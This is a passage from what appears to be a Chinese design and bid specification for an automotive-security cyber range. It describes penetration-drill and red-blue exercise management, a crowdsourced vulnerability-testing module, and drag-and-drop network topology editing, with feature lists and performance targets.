data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/17b9250c85347072bf597a5fec30fc30.png" alt="IMG_256"></p><ul><li>提供演练的手动提前开始，手动提前结束功能；支持演练过程中对场景进行暂停、恢复以及延期，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/274cd767027ebaf4d346560679ed8965.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b06bfd5375c5f4f167a231f43f93a04e.png"></p><p>功能参数设计为，系统提供渗透演练支持，包括顺序闯关和随机闯关两种模式，顺序闯关模式允许演练人员按照渗透训练场景任务顺序完成任务，并实时展示下一任务。在演练过程中，系统支持渗透成果的提交，包括特征码和证据文档等，裁判可对提交的成果进行下载与审核，并给予评价。系统还支持红蓝对抗演练场景的定义，设定红蓝角色及队伍，配置不同的演练任务，并设置演练场景内不同设备的访问权限。在红蓝对抗中，系统能够根据周期为双方计算积分，并支持演练中统计红蓝队伍和演练人员的得分，涵盖攻击得分、防守得分、异常检测扣分等。</p><p>系统还支持蓝方靶标状态的周期性检测，可配置检测内容与脚本，参数包括周期、指令、参数、系统等。蓝方可以提交防御报告，裁判对此进行审核与评分。系统支持综合演练场景的网络拓扑灵活定义，设置多种任务验证类型，包括静态Flag提交、动态Flag提交及报告提交。综合演练还支持防御方任务的定义，配置防御任务检验脚本，裁判可以人工研判防御效果，通过定义校验脚本对防御效果进行校验，并查看检测结果。</p><p>系统允许设计师控制演练的开始和停止，在开始后，演练人员可接入演练环境进行综合演练。系统支持演练环境的批量生成、部署、测试、流量采集、录屏监控等功能，并支持环境需求的高层封装，自动计算并填充部署所需参数。系统还支持演练相关要素的一键配置，展示配置的进度及结果，根据选择的靶标和演练队伍自动进行环境分配。此外，系统提供演练前测试功能，能够还原演练数据，并支持统计包含演练队伍排行、任务完成情况等。</p><p>系统支持公共靶标和非公共靶标的配置与分配，定期检测靶标服务状态，并展示各周期检测结果。提供靶标异常统计，设计师可查看异常日志，并按队伍和任务筛选。系统支持演练人员提交成果验证状态的实时查看，设计师可查看各队伍、各任务的完成进度与状态。设计师可随时接入演练环境，对虚拟机进行管理，包含重启、重置等功能。系统提供演练的手动提前开始、结束功能，支持场景的暂停、恢复及延期，并提供演练的归档功能，自动生成全面统计报告并提供下载。</p><p>性能参数设计为，系统支持配置200人同时开展演练。</p><p>提供一个全面的渗透演练平台，用于支持网络安全专业人员和团队进行渗透测试训练和红蓝对抗演习。平台将提供多种演练模式，支持成果提交与审核，红蓝对抗的定义和积分系统，以及灵活的网络拓扑设计和环境控制。该方案将满足至少200人同时开展演练的性能要求。</p><h4 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h4><p>演练模式支持</p><p>顺序闯关模式：允许演练人员按照预设的任务顺序进行渗透测试，完成一个任务后实时展示下一个任务。平台将提供相应的功能截图以证明此功能。</p><p>随机闯关模式：演练人员可以随机选择任务进行渗透测试。</p><p>成果提交与审核</p><p>成果提交：演练人员可提交特征码、证据文档等成果。</p><p>成果审核：裁判可以下载并审核提交的成果，并给予评价。</p><p>红蓝对抗场景定义</p><p>角色设定：定义红蓝双方角色及队伍，配置不同的演练任务。</p><p>访问权限设置：设置演练场景内不同设备的访问权限。</p><p>对抗积分系统</p><p>周期性对抗：根据预设周期计算红蓝双方积分。</p><p>得分统计：统计攻击得分、防守得分、异常检测扣分等。</p><p>靶标状态检测</p><p>周期性检测：配置周期性检测靶标状态的内容和脚本。</p><p>检测参数配置：包括周期、指令、参数、系统、协议、端口等。</p><p>防御报告提交与审核</p><p>报告提交：蓝方可以提交防御报告。</p><p>报告审核：裁判审核报告并给予评分。</p><p>网络拓扑与任务验证</p><p>网络拓扑定义：灵活定义综合演练场景的网络拓扑。</p><p>任务验证类型：支持多种任务验证类型。</p><p>演练控制与环境管理</p><p>演练控制：设计师可控制演练的开始与停止。</p><p>环境接入：演练人员可接入演练环境进行综合演练。</p><p>环境部署与配置</p><p>批量环境管理：支持环境的批量生成、部署、测试等。</p><p>一键配置：支持演练相关要素的一键配置。</p><p>演练测试与统计</p><p>演练前测试：支持演练前的测试功能。</p><p>统计功能：包含演练队伍排行及任务完成情况统计。</p><p>靶标管理与检测</p><p>靶标配置：支持公共和非公共靶标的配置与分配。</p><p>服务状态检测：提供定期检测靶标服务状态。</p><p>成果与进度管理</p><p>成果验证查看：实时查看演练人员提交成果验证状态。</p><p>进度监控：设计师可查看各队伍、各任务的完成进度。</p><p>虚拟机管理</p><p>虚拟机操作：设计师可对虚拟机进行管理，包括重启、重置等。</p><p>演练流程控制</p><p>手动控制：提供演练的手动开始、结束以及场景控制功能。</p><p>演练归档</p><p>归档与报告：演练结束后，自动生成统计报告并提供下载。</p><p>参与人数：平台支持不低于200人同时开展演练。</p><p>预期结果</p><p>提供一个高性能、可靠的渗透演练平台。</p><p>支持大规模的红蓝对抗演练。</p><p>提高演练人员的渗透测试能力和团队协作效率。</p><p>汽车安全演练模块主要为系统提供攻防演练业务支撑，该模块提供一个仿真的网络运行状态隔离的、安全可控的演练网络环境。基于该子系统，从事网络与信息安全相关试验的研究机构可以快速建立各种场景的演练测试环境，在网络层、主机层、应用层等各个层面上进行安全技术研究，开展相关的网络与信息安全攻防演练，同时提供的过程监控工具，可以对所进行的演练进行分析评估。</p><p>支持复杂网络拓扑模拟，具备实时监控与评估各组攻防态势的能力。主要包括演练场景的设计和配置，用于与演练并进行结果提交等相关操作。演练场景管理包括演练前配置、演练中监控与查看、演练结束后的归档与报告。演练前的配置包括演练人员配置、接入机器配置、靶标配置、演练任务配置、异常检测等几个方面。演练中主要包括队伍人员靶标得分统计、靶标服务异常检测展示、演练通知消息发送以及大屏展示。演练后主要包括演练的得分排名、演练报告查看等，主要为用户提供攻防演练的服务。演练能够并行开展多个场景，支持模板管理功能，可基于模板快速的生成演练环境以及完成演练场景的相关配置。</p><p>靶场支持实验人员接入环境内虚拟终端。教员可查看学员的在线状态，查看接入虚拟终端运行状态。监控数据通过web方式接入，可对接入终端通过检测项来确认开放端口、网络可达，是否接入等信息，检测结果可导出。</p><h4 id="攻防演练类型"><a href="#攻防演练类型" class="headerlink" title="攻防演练类型"></a>攻防演练类型</h4><p>系统支持红蓝对抗、渗透闯关、综合演练、护网演练等多种演练场景的设计与部署。</p><p>红蓝对抗：设计师在一个实验环境内将实验员分为红蓝两队。攻击队伍利用对逆向、漏洞挖掘、Web渗透等工具对靶标进行攻破。最后拿到靶标的动态flag上传系统来证明已经攻破。</p><p>渗透演练：在渗透演练中，攻击队伍不清楚靶标漏洞情况，需要利用网络知识和漏洞扫描结果进行合理推断，获得对网络和靶标的了解，最终利用多种工具攻破靶标。</p><p>综合演练系统具备以下功能：支持多样的拓扑结构，可灵活配置靶标验证方式； 提供任务分配功能，支持静态flag和动态flag；支持定义训练过程中的任务、设置和分配靶标，并配置人员队伍；提供靶标服务的检测功能；用户可提交训练结果，并监控训练过程；支持查询人员队伍得分，发送公告和通知；提供可视化展示功能； 在训练结束后，支持释放系统资源和归档训练数据。</p><h4 id="演练场景管理"><a href="#演练场景管理" class="headerlink" title="演练场景管理"></a>演练场景管理</h4><p>攻防演练场景管理主要提供渗透闯关、红蓝对抗、综合演练、护网演练等类型场景的管理功能。提供演练前配置、演练中监控与控制、演练后归档与统计的管理功能。场景管理用于对场景内容的定义，包括场景的基本描述、场景的网络环境、场景的任务步骤、场景的人员角色、场景的接入配置等内容。可以经设计好的场景转成模板，供演练子系统复用。攻防场景设计管理包括新增、删除、修改系统中的攻防场景。</p><h5 id="场景前配置"><a href="#场景前配置" class="headerlink" title="场景前配置"></a>场景前配置</h5><p>在演练开始之前的场景前配置是确保演练顺利开展的重要环节，其内容会根据不同的演练场景而有所变化。这项准备工作通常涉及设定参与的队伍和演练人员，以及他们所使用的接入机器和目标系统（靶标）。同时，还需要配置Flag的更新机制来保证演练的连续性和监管性，包括流量过滤规则来确保网络安全和异常检测机制以及时发现并处理潜在的风险或攻击行为。这些步骤共同构成了演练的基础框架，是演练能够按计划执行的关键。</p><h5 id="演练中管理"><a href="#演练中管理" class="headerlink" title="演练中管理"></a>演练中管理</h5><p>演练进行过程中，设计师可对演练进程进行控制，包含开始、暂停、恢复、结束、延迟演练。支持演练的重新开始，还原一个初始的演练。</p><p>支持试验任务的调度管理与进度管理，支持训练整体导调的开始、暂停、恢复、结束、初始化等操作，此外还支持试验清空，并保存为模板。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b22662c3c410db0b3e194cfa8605c653.png"></p><p>演练进度步骤管理</p><h5 id="演练后归档"><a href="#演练后归档" class="headerlink" title="演练后归档"></a>演练后归档</h5><p>支持演练场景按照设定的时间自动开始与结束，并支持演练设计人员手动开始与结束演练。演练后，能够对演练的资源进行释放，并查看最后的得分详情，包括个人积分、团队积分，攻击得分，防守失分，异常失分等。设计师能查看队伍的排名，并能查看自动生成演练报告。</p><h2 id="汽车安全众测模块"><a href="#汽车安全众测模块" class="headerlink" title="汽车安全众测模块"></a>汽车安全众测模块</h2><p>功能参数如下：</p><ol><li>支持设置众测名称、时长、内容，支持众测活动是否发布；</li><li>众测过程中，支持渗透成果的提交，成果包括特征码，证据文档等。裁判能够对众测人员提交的成果进行下载与审核，并给予评价；</li><li>支持对众测人员在动态测试接入网关上的操作进行监控与录屏；</li><li>众测模式可支持内部或外部，内部众测采用内网访问方式，外部众测可通过配置并发放VPN账号的方式接入访问，支持对VPN访问的通断控制；</li><li>支持设计师对众测的开始、停止的控制，在开始后，众测人员能够接入到众测环境中进行综合众测；</li><li>结合动态测试接入网关支持对被测对象的蓝牙、WiFi、CAN、USB调试接口进行渗透测试；</li><li>支持众测人员提交成果验证状态的实时查看，支持设计师对各队伍、各任务完成进度与状态的查看；</li><li>支持设计师在众测过程中随时接入众测环境，对动态测试接入网关进行管理，包含重启、重置等；</li><li>提供众测的手动提前开始，手动提前结束功能；支持众测过程中对场景进行暂停、恢复以及延期；</li><li>支持众测的归档功能，众测结束会自动生成全面统计的报告，提供报告下载功能；</li><li>支持与漏洞平台同步数据。</li></ol><p>性能参数如下：</p><ol><li>支持配置60人开展众测；</li><li>支持同一时刻每套动态测试接入网关接入人数3人。</li></ol><p>安全众测服务模块是围绕漏洞生态体系打造的集漏洞情报、漏洞挖掘、专家响应、安全服务定制化于一体的综合性安全服务平台，开创众测新时代时代，重塑众测新业态。模块通过打造“人员可信，全程可视，风险可控，行为可阻，违规可溯”的五可理念，以攻击者思维，在安全可控的场景下，由经验丰富的安全专家模拟黑客对业务系统进行全面深入的安全测试，为客户提供高价值的安全众测服务。</p><p>人员可信：模块实行非开放注册制，任何一名加入平台的安全研究人员均需提交个人信息，通过技术靶场检验，严格的背景调查及合同签署审核认证等机制，确保平台人员的身份可信、技能优越。</p><p>全程可视：众测系列服务全程接入监控产品进行可视化支撑，通过对流量数据的监测分析及数据间的关联关系判断，识别当前动作所处攻击环节，同时定位攻击发起时间、攻击利用位置、攻击源等信息，对测试动作进行还原描绘，按照攻击链理论将测试动作映射到攻击链模型上，形成完整攻击链的可视，使安全服务过程“实战化 ”呈现。</p><p>风险可控：众测创新技术突破，是拥有全过程全流量监测分析能力的众测服务平台，可以对http、https进行全流量分析，全过程无死角，攻击过程大屏可视化展示。根据客户要求设置项目加入限制，并结合法律法规以确保正确开展工作。</p><p>行为可阻：众测利用账户权限管理，对安全研究人员的临时项目测试账号进行严格管控，配合行为审计系统，一但发现测试过程中存在恶意、违规行为，将立即撤销测试账号权限，从而阻断测试通道防止产生后续损失，并永久取消其项目参与资格。</p><p>违规可溯：在测试过程中，众测通过技术手段对测试动作进行实时全流量捕获，形成审计日志，可进行溯源、实时反溯查处，平台所记录日志将遵循安全记录，永久保密的原则，且仅供客户及监管单位进行审计使用。</p><h4 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h4><p>针对企业对风险感知的需求，挑选相对应技术领域顶尖白帽精英，提供不设任何限制条件的网络安全攻击对抗服务。</p><h5 id="众测"><a href="#众测" class="headerlink" title="众测"></a>众测</h5><p>企业可随时根据业务计划或预算进行调整，根据实际情况众测模块为企业量身挑选15～50名最擅长该领域的精英白帽，定制专属的安全测试团队，提供漏洞挖掘服务。</p><h5 id="新测"><a href="#新测" class="headerlink" title="新测"></a>新测</h5><p>企业新业务上线前检测，全方位探知业务漏洞，防范新业务引入新风险，构建业务运营推广前的最后一道检验防线，从而提升开发人员安全意识，完善组织规范。</p><h5 id="专测"><a href="#专测" class="headerlink" title="专测"></a>专测</h5><p>认证的白帽专家深入行业/地域业务，根据客户需求，指定安全专家进行常态性、周期型的跟踪漏洞挖掘服务，在不增加用户风险的情况下，大幅度提升安全测试效果。</p><h5 id="常测"><a href="#常测" class="headerlink" title="常测"></a>常测</h5><p>安全专家结合自动化工具，常态化定期对目标进行漏洞检测，风险监测，漏洞预警，持续化关注安全风险态势。对发现的漏洞问题可不断的修正，直到处于风险可接受的范围内，极大降低了因安全缺陷导致的隐患与负面影响。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/64e5283ee7570f3d006d628236fe04ed.png" alt="IMG_256"></p><p>众测模块流程</p><h2 id="试验场景设置模块"><a href="#试验场景设置模块" class="headerlink" title="试验场景设置模块"></a>试验场景设置模块</h2><ul><li>目标网络设置采用拖拽式设计方式，能够对网络设备、主机设备、车端设备、测试工具等虚实目标网络环境进行统一配置；支持共享编辑、多层级网络编辑、批量节点快速复制、模板组合编辑等多种便捷编辑方式，并提供鹰眼、编组对齐、操作记录撤回、批量修改等多种便捷工具箱提高目标网络设计效率；支持通过镜像线的方式对汽车网络中需要旁路接收指定节点流量的设备进行设计和配置；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8a4e923b486dd76d487d16d131584e56.png"></p><p>网络拓扑编辑</p><p>该目标网络设置可利用拖拽方式进行，能够对网络设备、主机设备、车端设备、测试工具等虚实目标网络环境进行统一配置，完成组网。同时支持与协作伙伴进行共享编辑、多层级网络编辑、批量节点快速复制、模板组合编辑等多种便捷编辑方式。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b1af5f81d31c880653229f0e4d7df9ff.png"></p><p>对齐和鹰眼功能</p><p>该模块具备鹰眼、编组对齐、操作记录撤回、批量修改等多种便捷工具箱，能极大提高目标网络设计效率。还能通过镜像线的方式对汽车网络中需要旁路接收指定节点流量的设备进行设计和配置。</p><ul><li>拓扑编组对齐工具提供设备的编组和解除编组能力，并提供分组颜色的配置，能够对多个设备进行上对齐、下对齐、左对齐、右对齐、水平居中对齐、垂直居中对齐、水平平均分布、垂直平均分布操作，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ba4ce2da8bf89fa048523456b1961fc0.png"></p><p>分组</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/644085883411b125dc1eda2e6558f103.png" alt="企业微信截图_17035375184535"></p><p>自动对齐</p><ul><li>支持将整个场景拓扑或者区域子网络拓扑保存成模板，并且能够利用多个模板快速组合设计网络。支持将模板导出成json格式文件进行保存。场景模板的导入支持严格校验模板配置，也支持仅导入拓扑结构，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f4c439c5dd3e8b333deb08d4662a99ae.png" alt="企业微信截图_17035379883155"></p><p>场景拓扑或者区域子网络拓扑保存成模板</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/5a9600e355f1888e76fd05213be8cef1.png" alt="企业微信截图_17035380017066"></p><p>利用多个模板快速组合设计网络</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/15611232d42a09f7af1a83fd99aedc42.png" alt="1703511598819"></p><p>json格式文件导出</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/82e2eca23ec3d96754f5e50e13b59821.png" alt="1703511631371"></p><p>模板导入</p><p>功能参数设计为，系统采用拖拽式设计方式对网络设备、主机设备、车端设备和测试工具等虚实目标网络环境进行统一配置。功能包括共享编辑、多层级网络编辑、批量节点快速复制和模板组合编辑，同时提供鹰眼、编组对齐、操作记录撤回和批量修改等工具箱提高设计效率。</p><p>系统通过镜像线方式对汽车网络中旁路接收指定节点流量的设备进行配置。目标网络环境的网络拓扑编辑支持树形展示，能快速定位节点，并在网络拓扑中突出显示查找节点。</p><p>系统在编辑界面支持利用虚拟机名称搜索并定位虚拟机，目标网络拓扑鹰眼展示支持拓扑放大缩小，鹰眼窗口随屏幕展示的拓扑位置移动。拓扑编辑还支持网络拓扑图的滚动式缩放和分层式节点聚合，提供快速查找定位节点能力，支持基于目录的子网络跳转和返回。拓扑编组对齐工具提供设备的编组和解除编组功能，支持分组颜色配置，多个设备的对齐和分布操作。</p><p>系统支持在拓扑编辑界面的虚拟设备多选，进行多个虚拟设备位置移动，展示虚拟机连线相关端口的两端IP地址。网络拓扑界面可查看节点、子网属性，包括部署情况、端口情况。操作记录撤回支持网络节点位置和配置记录，记录拓扑修改和节点配置修改，支持配置操作撤回，撤回步数不少于5步。</p><p>系统支持将整个场景拓扑或区域子网络拓扑保存成模板，支持多个模板快速组合设计网络，模板导出成json格式文件。场景模板导入支持严格校验模板配置或仅导入拓扑结构。模块支持设备复制功能，复制的设备自动配置连线、设备名称、IP等信息。</p><p>系统通过集群方式批量创建类似虚拟主机，支持批量创建的虚拟主机自动配置设备名称、IP等信息，单个集群支持批量创建数量1000个；支持批量对主机配置进行修改，修改信息包括虚拟机镜像、配额、IP等属性。</p><p>性能参数设计为，系统支持大规模拓扑设计，单一拓扑支持5000节点配置能力，网络嵌套层级为3层，单个网络场景内子网络数量为100个，隔离网络数量为1000个。系统支持同时配置的网络场景数量为200个。</p><h4 id="方案设计-1"><a href="#方案设计-1" class="headerlink" title="方案设计"></a>方案设计</h4><p>目标网络设置</p><p>本系统将采用拖拽式设计方式，能够对网络设备、主机设备、车端设备、测试工具等虚实目标网络环境进行统一配置。系统将支持共享编辑、多层级网络编辑、批量节点快速复制、模板组合编辑等多种便捷编辑方式，并提供鹰眼、编组对齐、操作记录撤回、批量修改等多种便捷工具箱提高目标网络设计效率。此外，系统支持通过镜像线的方式对汽车网络中需要旁路接收指定节点流量的设备进行设计和配置。</p><p>2. 网络拓扑编辑功能</p><p>目标网络环境的网络拓扑编辑将支持网络环境的树形展示，提供树形分支节点的快速查找定位节点的能力，能够对查找的节点在网络拓扑中的位置进行突出显示。系统还支持在编辑界面利用虚拟机名称搜索并定位搜索到的虚拟机；支持目标网络拓扑鹰眼展示，支持拓扑展示的放大缩小，鹰眼窗口能够随着屏幕展示的拓扑位置跟随移动。拓扑编辑支持网络拓扑图滚动式缩放及分层式节点聚合，支持网络环境的目录展示，提供快速查找定位节点的能力，以及基于目录进行子网络的跳转和返回。</p><p>3. 拓扑编组对齐与多选功能</p><p>拓扑编组对齐工具将提供设备的编组和解除编组能力，并提供分组颜色的配置，能够对多个设备进行上对齐、下对齐、左对齐、右对齐、水平居中对齐、垂直居中对齐、水平平均分布、垂直平均分布操作。此外，系统支持在拓扑编辑界面的虚拟设备多选，进行多个虚拟设备在编辑界面位置移动。</p><p>4. 拓扑编辑界面功能</p><p>在拓扑编辑界面上，系统的设计确保用户能够清楚地看到虚拟机之间的连线信息，包括但不限于相关端口的两端IP地址。这种展示方便了用户在构建或修改虚拟网络环境时，对网络的连接关系有直观的认知。</p><p>系统还提供了功能强大的网络拓扑查看工具，使得用户不仅能够在图形化界面上审视整体的网络结构，还能深入每个节点和子网，查看它们的详细属性。这些属性可能包括：</p><p>部署情况：用户可以查看每个节点的软件和服务配置，确认是否符合预定的部署方案。</p><p>端口情况：用户可以审视每个节点或子网的端口状态，包括端口编号、协议类型以及端口的开放或关闭状态。</p><p>这些功能使得网络管理员能够更加高效地管理和监控整个虚拟环境，确保网络配置的精确性，并及时地调整和解决网络中的各种问题。</p><p>5. 操作记录撤回与模板功能</p><p>操作记录撤回将支持网络节点位置记录和配置记录，支持记录拓扑修改和节点配置修改，支持配置操作撤回，支持撤回步数不少于5步。系统还支持将整个场景拓扑或者区域子网络拓扑保存成模板，并且能够利用多个模板快速组合设计网络。支持将模板导出成json格式文件进行保存。场景模板的导入支持严格校验模板配置，也支持仅导入拓扑结构。</p><p>6. 设备复制与集群批量创建功能</p><p>模块支持设备复制的功能实现已配置设备的快速配置，复制的设备支持自动配置连线、设备名称、IP等信息。系统支持通过集群的方式实现利用主机模型批量创建多个类似的虚拟主机，批量创建的虚拟主机支持自动配置设备名称、IP等信息，单个集群支持批量创建的虚拟主机数量不低于1000个；支持批量对主机的配置进行修改，修改的信息包括虚拟机镜像、配额、IP等属性。</p><p>7. 性能参数要求</p><p>系统支持大规模拓扑的设计，单一拓扑支持不低于5000节点配置能力，支持的网络嵌套层级不低于3层，单个网络场景内子网络数量不低于100个，隔离网络数量不低于1000个。同时，系统支持同时配置的网络场景数量不低于200个。</p><h4 id="试验步骤配置"><a href="#试验步骤配置" class="headerlink" title="试验步骤配置"></a>试验步骤配置</h4><p>系统支持10万级节点试验步骤配置能力，并能适应后续规模扩展要求。试验步骤配置主要支持试验任务的分解与分派，包括子任务与前置任务的管理；支持试验任务的调度管理与进度管理以及试验人员的操作行为后台录制的配置管理；支持试验人员的操作行为后台录制和录制管控；支持录屏视频的回放与删除。支持试验的开放并允许试验人员登录试验环境中的主机，支持停止并中断试验人员对试验环境中的主机的访问。支持对试验的开始、暂停、恢复、结束等指令的控制。设计人员可以在试验进行中的任意时刻启动暂停，对试验做出指导。</p><p>系统支持带外执行命令脚本任务配置。配置参数包括操作系统、指令、参数、设备以及描述等字段。并能根据配置执行相关命令。带外执行命令脚本任务支持将操作系统、指令等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出 。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b312f96a57bdee2fac1029789bcf42a8.png"></p><p>带外执行脚本</p><h5 id="文件写入任务"><a href="#文件写入任务" class="headerlink" title="文件写入任务"></a>文件写入任务</h5><p>系统支持文件写入任务配置。配置参数包括操作系统、写入路径、写入方式（追加、覆盖）、写入分类以及设备（名称、IP、系统）。文件写入任务支持将操作系统、写入路径、写入方式等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/960323d7ec2f78f152ebfa1e3992c2cd.png"></p><p>写入任务配置</p><h5 id="文件读取任务"><a href="#文件读取任务" class="headerlink" title="文件读取任务"></a>文件读取任务</h5><p>支持文件读取任务配置。配置参数包括操作系统、读取路径、读取周期、发送KAFKA配置（地址、TOPIC）、设备以及描述等字段。同时，支持将操作系统、读取路径等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/2b1964c3c089b79abcb198b3daa2a517.png"></p><p>文件读取任务</p><h5 id="拓扑绘制"><a href="#拓扑绘制" class="headerlink" title="拓扑绘制"></a>拓扑绘制</h5><p>随着B/S移动计算的普及，笔记本、平板和手机等家电的整合，各种设备都有专有的计算，其中包括Android、微软、苹果、Flash等，它们在发展的过程中都暴露出自己的缺点和瓶颈。对开发者而言，大多数情况中开发的应用只能适用于单一平台，必须投入巨大精力才能保证应用的兼容性。这种情况限制了开发者的创造力，也限制了用户们的选择。但是，HTML5的出现解决了上述问题。互联网巨头们最终达成一致，共同开发和发展HTML5新技术。系统需要实现拓扑图的绘制和编辑，HTML5可以解决系统的需求。HTML5有着良好的跨越浏览器支持的标准、具有本地存储、脱机运作、基于GPS的地理定位、绘图、视频和多媒体等优点，无论是传统B/S架构应用还是最新移动领域的应用，它都提供了丰富而全面的支持。</p><p>系统中网络拓扑图绘制中心面板是用HTML5 Canvas实现的，面板中实现了拓扑图的更新、设备的拖动(包括ROUTER、ApplicationServer、Switch和WinXP等)、连线绘制和删除。在提交实验和结束实验之后，还要更新各个设备的属性信息。如果不采用HTML5，想要在浏览器中实现绘制网络拓扑结构图，在实现上有三种方案可供选择。</p><p>方案1：VML技术，VML是微软的技术标准，它相当于IE浏览器里面的画笔，通过它可以绘制自己想要的图形，结合脚本它可让图形制作出动态效果。虽然它是基于XML标准并能够绘制高质量的矢量图形，但VML只能运行于基于内核的浏览器。</p><p>方案2：SVG技术，和方案l相反的是，SVG是W3C制定的浏览器矢量绘图标准，但是在IE中必须安装指定的插件才能支持SVG。</p><p>方案3：Flex开发技术，用Flex生成的Flash具有较强的图形效果，同样，它也是需要Flash的插件才能支持在浏览器中执行Flash格式。可见，HTML5能够克服以上缺点，它是一个标准，不需要安装指定插件就可以在浏览器中得到支持，并且能够满足系统的需求。</p><p>系统中实验主面板中的元素由Canvas绘制而成。首先在Layout页面上插入Canvas元素创建一个空白矩形区域，一般要在创建的时候设置它的width和height元素，然后就可以通过API对它进行操作。和&lt;div&gt;元素类似，它形成了一个白色空白区域，但是两者的用途不同。然后通过getContext方法(Canvas要调用的第一个方法)获取画布面板的上下文，之后所有的操作都是在此上下文上的操作。CNEP中用到了HTML5的拖放API，用户可以从左侧设备元素栏选择需要的网络设备并把它们拖放到右侧的实验主面板中，在Canvas中绘制此网络设备图形。最后通过在Canvas上面绘制直线来完成设备间的连线，同时还可以在画布面板上面拖动设备元素。</p><p>目标网络的拓扑绘制通过界面拖拽完成，可以对网络节点进行增、删、改等操作。实物网络节点的设计和配置统一采用四种尺度节点，并支持通过鼠标拖拽的方式动态组网。同时，可以通过鼠标拖曳的方式将非虚实互联的实物节点描述到目标网络设计中。</p><p>系统提供强大的功能，支持通过直观的拖拽操作，将网络拓扑内的节点灵活组网与配置。不论是虚拟网络设备、虚拟主机设备还是实物设备，都可以轻松进行操作和设置。主机的配置方面，系统提供了丰富的选项，包括基础信息、系统信息和网络信息，以满足各种需求。 拓扑工具提供设备编组和解除编组的功能，使得管理和调整设备位置变得更加便捷。系统提供了一系列对齐工具，能对设备进行多种对齐操作，包括上下左右对齐及水平垂直居中，还能够进行水平和垂直的均匀分布，以确保网络拓扑的整齐和美观。为了优化工作流程，将整个网络场景或特定子网络的拓扑结构保存为模板，这些模板可以互相组合，以便快速设计网络。模板可以导出为JSON格式，简化了数据的保存与分享过程。在导入模板时，系统会进行详尽的配置审核，以保证拓扑结构的准确性。根据需要，您还可以选择仅导入拓扑架构并根据实际需求进行自定义。系统还支持通过集群模式批量创建虚拟主机，允许您使用主机模型来实现快速部署，并且这些虚拟主机的配置，如设备名称、IP地址等，都可以自动设定并根据需要灵活调整。另外，系统也提供了批量修改主机配置的功能，方便地修改虚拟机镜像、配额、IP等属性，从而满足不同场景的需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/69c5ada81128bf3801a013905f38cc6c.png"></p><p>网络拓扑构建</p><h5 id="可视化编辑模块"><a href="#可视化编辑模块" class="headerlink" title="可视化编辑模块"></a>可视化编辑模块</h5><p>为了让管理员更好地通过拓扑图管理子系统进行集中管理，用户管理界面最好能够提供<a href="http://baike.baidu.com/view/52024.htm">直观</a>的网络拓朴图，实时显示整个网络的安全状况，使管理员可以便捷地查看各安全产品组件的状态、日志以及信息处理结果，产生安全趋势分析报表。因此可视化管理技术的研究与应用尤为重要。可视化编辑子系统提供复杂虚拟网络定制的界面，支持基于可视化创建网络拓扑图、根据其他模块所创建和配置的网络元素、虚拟机模板、实例以及虚拟网络等元素，在界面上按照要求拖动需要的元素，然后连线构件各个元素之间的关系。</p><p>本项目的可视化编辑模块用的可视化编辑工具是JointJS。JointJS是一个跨浏览器的JavaScript工具包，用于创建完全互动式图表。它基于Raphaël.js开发。这个工具包拥有一套基于插件的可扩展机制，可以轻松扩展现有功能。支持多人并行编辑和配置。</p><p>JointJS是一个跨浏览器的JavaScript工具包，用于创建完全互动式图表。这个工具包拥有一套基于插件的可扩展机制，可以轻松扩展现有功能。当前已经提供了一些可以马上使用的插件来绘制常见的图形包括：ERD、Org 